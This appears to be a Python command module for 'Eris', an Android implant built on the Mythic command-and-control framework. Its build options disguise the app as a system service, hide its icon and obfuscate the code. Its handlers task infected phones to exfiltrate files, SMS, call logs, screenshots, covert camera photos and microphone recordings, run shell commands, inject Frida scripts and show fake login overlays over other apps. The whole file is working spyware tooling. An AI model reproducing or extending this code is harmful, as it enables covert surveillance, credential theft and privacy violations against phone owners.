#!/usr/bin/env python3
"""
Eris Android Agent - Mythic Framework Command Functions
This file defines all command handlers and task creation functions for Mythic integration.
"""

import asyncio
import base64
import json
import uuid
from mythic_payloadtype_container import *
import sys
from pathlib import Path

# Add agent modules to path
sys.path.append(str(Path(__file__).parent / "agent"))

from agent.core_agent import MythicAgent
from agent.modules.filesystem import FileSystemModule
from agent.modules.stealth_surveillance import StealthSurveillanceModule
from agent.modules.call_logger import CallLoggerModule
from agent.modules.overlay import OverlayModule
from agent.modules.frida_loader import FridaLoaderModule
from mythic_integration import MythicTaskParser, MythicResponseFormatter
from command_dispatcher import CommandDispatcher

# Global agent instance
agent_instance = None

class ErisPayloadType(PayloadType):
    name = "eris"
    file_extension = "apk" 
    author = "@RedTeam"
    supported_os = [SupportedOS.Android]
    wrapper = False
    wrapped_payloads = []
    note = "Eris Android Agent with advanced stealth, surveillance, and persistence capabilities"
    supports_dynamic_loading = True
    build_parameters = [
        BuildParameter(
            name="campaign_id",
            description="Unique campaign identifier",
            parameter_type=BuildParameterType.String,
            required=True,
            default_value="default_campaign"
        ),
        BuildParameter(
            name="c2_profile", 
            description="Communication profile",
            parameter_type=BuildParameterType.ChooseOne,
            choices=["https_beacon", "fcm_push", "dns_covert"],
            default_value="https_beacon"
        ),
        BuildParameter(
            name="app_name",
            description="APK display name",
            parameter_type=BuildParameterType.String,
            default_value="System Service"
        ),
        BuildParameter(
            name="package_name",
            description="Android package identifier",
            parameter_type=BuildParameterType.String,
            default_value="com.android.systemservice"
        ),
        BuildParameter(
            name="target_android_version",
            description="Target Android version (12-16)",
            parameter_type=BuildParameterType.ChooseOne,
            choices=["12", "13", "14", "15", "16"],
            default_value="14"
        ),
        BuildParameter(
            name="encryption_algorithm",
            description="Data encryption cipher",
            parameter_type=BuildParameterType.ChooseOne,
            choices=["AES-256-GCM", "ChaCha20-Poly1305"],
            default_value="AES-256-GCM"
        ),
        BuildParameter(
            name="obfuscation_level",
            description="Code obfuscation strength",
            parameter_type=BuildParameterType.ChooseOne,
            choices=["none", "light", "strong"],
            default_value="strong"
        ),
        BuildParameter(
            name="enable_stealth_surveillance",
            description="Enable stealth camera and microphone",
            parameter_type=BuildParameterType.Boolean,
            default_value=True
        ),
        BuildParameter(
            name="enable_overlay",
            description="Enable overlay capabilities",
            parameter_type=BuildParameterType.Boolean,
            default_value=True
        ),
        BuildParameter(
            name="enable_frida",
            description="Enable Frida injection support", 
            parameter_type=BuildParameterType.Boolean,
            default_value=True
        ),
        BuildParameter(
            name="auto_hide",
            description="Hide app icon from launcher",
            parameter_type=BuildParameterType.Boolean,
            default_value=True
        )
    ]
    c2_profiles = ["http", "https"]
    mythic_encrypts = True

    async def build(self) -> BuildResponse:
        """Build the Eris Android agent APK"""
        try:
            # Import builder after path setup
            from builder.build_apk import APKBuilder
            
            # Create builder instance with parameters
            builder = APKBuilder(
                campaign_id=self.get_parameter("campaign_id"),
                app_name=self.get_parameter("app_name"),
                package_name=self.get_parameter("package_name"),
                c2_profile=self.get_parameter("c2_profile"),
                target_android_version=int(self.get_parameter("target_android_version")),
                encryption_algorithm=self.get_parameter("encryption_algorithm"),
                obfuscation_level=self.get_parameter("obfuscation_level"),
                enable_stealth_surveillance=self.get_parameter("enable_stealth_surveillance"),
                enable_overlay=self.get_parameter("enable_overlay"),
                enable_frida=self.get_parameter("enable_frida"),
                hide_app_icon=self.get_parameter("auto_hide")
            )
            
            # Build the APK
            result = await builder.build_apk_async(
                callback_host=self.callback_host,
                callback_port=self.callback_port,
                callback_uuid=self.uuid
            )
            
            if result["success"]:
                # Read the built APK
                with open(result["apk_path"], "rb") as f:
                    apk_data = f.read()
                
                return BuildResponse(
                    status=BuildStatus.Success,
                    payload=base64.b64encode(apk_data).decode(),
                    message=f"Successfully built Eris Android agent: {result['apk_path']}"
                )
            else:
                return BuildResponse(
                    status=BuildStatus.Error,
                    message=f"Build failed: {result.get('error', 'Unknown error')}"
                )
                
        except Exception as e:
            return BuildResponse(
                status=BuildStatus.Error,
                message=f"Build exception: {str(e)}"
            )

async def initialize_agent(callback_info: dict) -> None:
    """Initialize the global agent instance"""
    global agent_instance
    if agent_instance is None:
        agent_instance = MythicAgent(callback_info)
        await agent_instance.initialize()

# File System Commands
async def create_tasking_ls(task: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
    """List directory contents"""
    response = PTTaskCreateTaskingMessageResponse(
        task_id=task.Task.ID,
        success=True,
        completed=False
    )
    return response

async def process_ls(task: PTTaskMessageAllData) -> None:
    """Process ls command"""
    try:
        await initialize_agent(task.Callback.to_json())
        
        # Parse parameters
        path = task.Task.Params.get("path", ".")
        show_hidden = task.Task.Params.get("show_hidden", False)
        
        # Execute command
        result = await agent_instance.execute_command("ls", {
            "path": path,
            "show_hidden": show_hidden
        })
        
        # Send response
        await MythicRPC().execute("create_output", task_id=task.Task.ID, output=result["output"])
        await MythicRPC().execute("create_task_complete", task_id=task.Task.ID, success=result["success"])
        
    except Exception as e:
        await MythicRPC().execute("create_output", task_id=task.Task.ID, output=f"Error: {str(e)}")
        await MythicRPC().execute("create_task_complete", task_id=task.Task.ID, success=False)

async def create_tasking_download(task: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
    """Download file from device"""
    response = PTTaskCreateTaskingMessageResponse(
        task_id=task.Task.ID,
        success=True,
        completed=False
    )
    return response

async def process_download(task: PTTaskMessageAllData) -> None:
    """Process download command"""
    try:
        await initialize_agent(task.Callback.to_json())
        
        # Parse parameters
        path = task.Task.Params.get("path", "")
        if not path:
            raise ValueError("Missing required parameter: path")
            
        chunk_size = task.Task.Params.get("chunk_size", 1024000)
        
        # Execute command
        result = await agent_instance.execute_command("download", {
            "path": path,
            "chunk_size": chunk_size
        })
        
        if result["success"] and "file_data" in result:
            # Create artifact for downloaded file
            await MythicRPC().execute("create_artifact", 
                task_id=task.Task.ID,
                artifact_type="File",
                artifact=result["file_data"],
                filename=Path(path).name
            )
            
        await MythicRPC().execute("create_output", task_id=task.Task.ID, output=result["output"])
        await MythicRPC().execute("create_task_complete", task_id=task.Task.ID, success=result["success"])
        
    except Exception as e:
        await MythicRPC().execute("create_output", task_id=task.Task.ID, output=f"Error: {str(e)}")
        await MythicRPC().execute("create_task_complete", task_id=task.Task.ID, success=False)

async def create_tasking_upload(task: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
    """Upload file to device"""
    response = PTTaskCreateTaskingMessageResponse(
        task_id=task.Task.ID,
        success=True,
        completed=False
    )
    return response

async def process_upload(task: PTTaskMessageAllData) -> None:
    """Process upload command"""
    try:
        await initialize_agent(task.Callback.to_json())
        
        # Parse parameters  
        remote_path = task.Task.Params.get("remote_path", "")
        file_data = task.Task.Params.get("file_data", "")
        permissions = task.Task.Params.get("permissions", "644")
        
        if not remote_path or not file_data:
            raise ValueError("Missing required parameters: remote_path, file_data")
        
        # Execute command
        result = await agent_instance.execute_command("upload", {
            "remote_path": remote_path,
            "file_data": file_data,
            "permissions": permissions
        })
        
        await MythicRPC().execute("create_output", task_id=task.Task.ID, output=result["output"])
        await MythicRPC().execute("create_task_complete", task_id=task.Task.ID, success=result["success"])
        
    except Exception as e:
        await MythicRPC().execute("create_output", task_id=task.Task.ID, output=f"Error: {str(e)}")
        await MythicRPC().execute("create_task_complete", task_id=task.Task.ID, success=False)

# Surveillance Commands
async def create_tasking_screenshot(task: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
    """Take screenshot of device"""
    response = PTTaskCreateTaskingMessageResponse(
        task_id=task.Task.ID,
        success=True,
        completed=False
    )
    return response

async def process_screenshot(task: PTTaskMessageAllData) -> None:
    """Process screenshot command"""
    try:
        await initialize_agent(task.Callback.to_json())
        
        # Parse parameters
        quality = task.Task.Params.get("quality", 80)
        format_type = task.Task.Params.get("format", "png")
        display_id = task.Task.Params.get("display_id", 0)
        
        # Execute command
        result = await agent_instance.execute_command("screenshot", {
            "quality": quality,
            "format": format_type,
            "display_id": display_id
        })
        
        if result["success"] and "image_data" in result:
            # Create artifact for screenshot
            await MythicRPC().execute("create_artifact",
                task_id=task.Task.ID,
                artifact_type="Screenshot",
                artifact=result["image_data"],
                filename=f"screenshot_{task.Task.ID}.{format_type}"
            )
            
        await MythicRPC().execute("create_output", task_id=task.Task.ID, output=result["output"])
        await MythicRPC().execute("create_task_complete", task_id=task.Task.ID, success=result["success"])
        
    except Exception as e:
        await MythicRPC().execute("create_output", task_id=task.Task.ID, output=f"Error: {str(e)}")
        await MythicRPC().execute("create_task_complete", task_id=task.Task.ID, success=False)

async def create_tasking_camera(task: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
    """Capture photo from camera"""
    response = PTTaskCreateTaskingMessageResponse(
        task_id=task.Task.ID,
        success=True,
        completed=False
    )
    return response

async def process_camera(task: PTTaskMessageAllData) -> None:
    """Process camera command"""
    try:
        await initialize_agent(task.Callback.to_json())
        
        # Parse parameters
        camera_id = task.Task.Params.get("camera_id", 0)
        quality = task.Task.Params.get("quality", 80)
        flash = task.Task.Params.get("flash", False)
        
        # Execute command
        result = await agent_instance.execute_command("camera", {
            "camera_id": camera_id,
            "quality": quality,
            "flash": flash
        })
        
        if result["success"] and "image_data" in result:
            # Create artifact for photo
            await MythicRPC().execute("create_artifact",
                task_id=task.Task.ID,
                artifact_type="Photo",
                artifact=result["image_data"],
                filename=f"photo_{task.Task.ID}.jpg"
            )
            
        await MythicRPC().execute("create_output", task_id=task.Task.ID, output=result["output"])
        await MythicRPC().execute("create_task_complete", task_id=task.Task.ID, success=result["success"])
        
    except Exception as e:
        await MythicRPC().execute("create_output", task_id=task.Task.ID, output=f"Error: {str(e)}")
        await MythicRPC().execute("create_task_complete", task_id=task.Task.ID, success=False)

async def create_tasking_microphone(task: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
    """Record audio from microphone"""
    response = PTTaskCreateTaskingMessageResponse(
        task_id=task.Task.ID,
        success=True,
        completed=False
    )
    return response

async def process_microphone(task: PTTaskMessageAllData) -> None:
    """Process microphone command"""
    try:
        await initialize_agent(task.Callback.to_json())
        
        # Parse parameters
        duration = task.Task.Params.get("duration", 10)
        quality = task.Task.Params.get("quality", "high")
        
        # Execute command
        result = await agent_instance.execute_command("microphone", {
            "duration": duration,
            "quality": quality
        })
        
        if result["success"] and "audio_data" in result:
            # Create artifact for audio
            await MythicRPC().execute("create_artifact",
                task_id=task.Task.ID,
                artifact_type="Audio",
                artifact=result["audio_data"],
                filename=f"audio_{task.Task.ID}.wav"
            )
            
        await MythicRPC().execute("create_output", task_id=task.Task.ID, output=result["output"])
        await MythicRPC().execute("create_task_complete", task_id=task.Task.ID, success=result["success"])
        
    except Exception as e:
        await MythicRPC().execute("create_output", task_id=task.Task.ID, output=f"Error: {str(e)}")
        await MythicRPC().execute("create_task_complete", task_id=task.Task.ID, success=False)

# System Commands
async def create_tasking_shell(task: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
    """Execute shell command"""
    response = PTTaskCreateTaskingMessageResponse(
        task_id=task.Task.ID,
        success=True,
        completed=False
    )
    return response

async def process_shell(task: PTTaskMessageAllData) -> None:
    """Process shell command"""
    try:
        await initialize_agent(task.Callback.to_json())
        
        # Parse parameters
        command = task.Task.Params.get("command", "")
        timeout = task.Task.Params.get("timeout", 30)
        
        if not command:
            raise ValueError("Missing required parameter: command")
        
        # Execute command
        result = await agent_instance.execute_command("shell", {
            "command": command,
            "timeout": timeout
        })
        
        await MythicRPC().execute("create_output", task_id=task.Task.ID, output=result["output"])
        await MythicRPC().execute("create_task_complete", task_id=task.Task.ID, success=result["success"])
        
    except Exception as e:
        await MythicRPC().execute("create_output", task_id=task.Task.ID, output=f"Error: {str(e)}")
        await MythicRPC().execute("create_task_complete", task_id=task.Task.ID, success=False)

# Communication Commands
async def create_tasking_sms(task: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
    """Access SMS messages"""
    response = PTTaskCreateTaskingMessageResponse(
        task_id=task.Task.ID,
        success=True,
        completed=False
    )
    return response

async def process_sms(task: PTTaskMessageAllData) -> None:
    """Process SMS command"""
    try:
        await initialize_agent(task.Callback.to_json())
        
        # Parse parameters
        action = task.Task.Params.get("action", "list")
        limit = task.Task.Params.get("limit", 100)
        
        # Execute command
        result = await agent_instance.execute_command("sms", {
            "action": action,
            "limit": limit
        })
        
        if result["success"] and "sms_data" in result:
            # Create artifact for SMS data
            await MythicRPC().execute("create_artifact",
                task_id=task.Task.ID,
                artifact_type="SMS",
                artifact=json.dumps(result["sms_data"], indent=2),
                filename=f"sms_data_{task.Task.ID}.json"
            )
            
        await MythicRPC().execute("create_output", task_id=task.Task.ID, output=result["output"])
        await MythicRPC().execute("create_task_complete", task_id=task.Task.ID, success=result["success"])
        
    except Exception as e:
        await MythicRPC().execute("create_output", task_id=task.Task.ID, output=f"Error: {str(e)}")
        await MythicRPC().execute("create_task_complete", task_id=task.Task.ID, success=False)

async def create_tasking_call_log(task: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
    """Access call logs"""
    response = PTTaskCreateTaskingMessageResponse(
        task_id=task.Task.ID,
        success=True,
        completed=False
    )
    return response

async def process_call_log(task: PTTaskMessageAllData) -> None:
    """Process call log command"""
    try:
        await initialize_agent(task.Callback.to_json())
        
        # Parse parameters
        limit = task.Task.Params.get("limit", 100)
        call_type = task.Task.Params.get("call_type", "all")
        
        # Execute command
        result = await agent_instance.execute_command("call_log", {
            "limit": limit,
            "call_type": call_type
        })
        
        if result["success"] and "call_data" in result:
            # Create artifact for call log data
            await MythicRPC().execute("create_artifact",
                task_id=task.Task.ID,
                artifact_type="CallLog",
                artifact=json.dumps(result["call_data"], indent=2),
                filename=f"call_log_{task.Task.ID}.json"
            )
            
        await MythicRPC().execute("create_output", task_id=task.Task.ID, output=result["output"])
        await MythicRPC().execute("create_task_complete", task_id=task.Task.ID, success=result["success"])
        
    except Exception as e:
        await MythicRPC().execute("create_output", task_id=task.Task.ID, output=f"Error: {str(e)}")
        await MythicRPC().execute("create_task_complete", task_id=task.Task.ID, success=False)

# Advanced Commands
async def create_tasking_frida(task: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
    """Execute Frida script"""
    response = PTTaskCreateTaskingMessageResponse(
        task_id=task.Task.ID,
        success=True,
        completed=False
    )
    return response

async def process_frida(task: PTTaskMessageAllData) -> None:
    """Process Frida command"""
    try:
        await initialize_agent(task.Callback.to_json())
        
        # Parse parameters
        script = task.Task.Params.get("script", "")
        target_process = task.Task.Params.get("target_process", "")
        
        if not script:
            raise ValueError("Missing required parameter: script")
        
        # Execute command
        result = await agent_instance.execute_command("frida", {
            "script": script,
            "target_process": target_process
        })
        
        await MythicRPC().execute("create_output", task_id=task.Task.ID, output=result["output"])
        await MythicRPC().execute("create_task_complete", task_id=task.Task.ID, success=result["success"])
        
    except Exception as e:
        await MythicRPC().execute("create_output", task_id=task.Task.ID, output=f"Error: {str(e)}")
        await MythicRPC().execute("create_task_complete", task_id=task.Task.ID, success=False)

async def create_tasking_overlay(task: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
    """Create overlay window"""
    response = PTTaskCreateTaskingMessageResponse(
        task_id=task.Task.ID,
        success=True,
        completed=False
    )
    return response

async def process_overlay(task: PTTaskMessageAllData) -> None:
    """Process overlay command"""
    try:
        await initialize_agent(task.Callback.to_json())
        
        # Parse parameters
        overlay_type = task.Task.Params.get("type", "login")
        target_app = task.Task.Params.get("target_app", "")
        
        # Execute command
        result = await agent_instance.execute_command("overlay", {
            "type": overlay_type,
            "target_app": target_app
        })
        
        await MythicRPC().execute("create_output", task_id=task.Task.ID, output=result["output"])
        await MythicRPC().execute("create_task_complete", task_id=task.Task.ID, success=result["success"])
        
    except Exception as e:
        await MythicRPC().execute("create_output", task_id=task.Task.ID, output=f"Error: {str(e)}")
        await MythicRPC().execute("create_task_complete", task_id=task.Task.ID, success=False)

# Command mappings for Mythic framework
command_handlers = {
    "ls": process_ls,
    "download": process_download,
    "upload": process_upload,
    "screenshot": process_screenshot,
    "camera": process_camera,
    "microphone": process_microphone,
    "shell": process_shell,
    "sms": process_sms,
    "call_log": process_call_log,
    "frida": process_frida,
    "overlay": process_overlay
}

command_creators = {
    "ls": create_tasking_ls,
    "download": create_tasking_download,
    "upload": create_tasking_upload,
    "screenshot": create_tasking_screenshot,
    "camera": create_tasking_camera,
    "microphone": create_tasking_microphone,
    "shell": create_tasking_shell,
    "sms": create_tasking_sms,
    "call_log": create_tasking_call_log,
    "frida": create_tasking_frida,
    "overlay": create_tasking_overlay
}
